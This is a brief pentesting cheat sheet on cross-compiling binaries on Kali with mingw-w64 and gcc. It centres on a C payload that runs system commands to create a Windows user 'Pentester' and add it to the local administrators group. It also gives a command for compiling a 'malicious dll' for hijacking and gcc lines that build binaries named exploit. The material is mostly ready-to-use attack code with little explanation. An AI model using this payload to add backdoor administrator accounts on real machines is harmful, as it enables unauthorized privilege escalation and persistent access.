# X-Compiling binaries on kali

## Get cross-compiler for windows

`apt install mingw-w64 `


```c
#include <stdlib.h>

int main ()
{
  int i;
  
  // i for debugging
  i = system ("net user Pentester Password1 /add");
  i = system ("net localgroup administrators Pentester /add");
  
  return 0;
}
```

cross compile for 32 bit
	
`i686-w64-mingw32-gcc foo.c -o foo.exe`


cross compile for 64 bits
	
`x86_64-w64-mingw32-gcc foo.c -o foo.exe`
	
List compilation options
	
	apt-cache search mingw-w64
	
Compile malicious dll

`x86_64-w64-mingw32-gcc windows_dll.c --shared -o hijackme.dll`

## For Linux

Use another box or directly on kali

if doesn't compile, for older machines add : `-static -static-libgcc -static-libstdc++`

```bash
#For x64 bit:

gcc -m64 hello.c -o exploit

#For x32 bit:

gcc -m32 hello.c -o exploit
```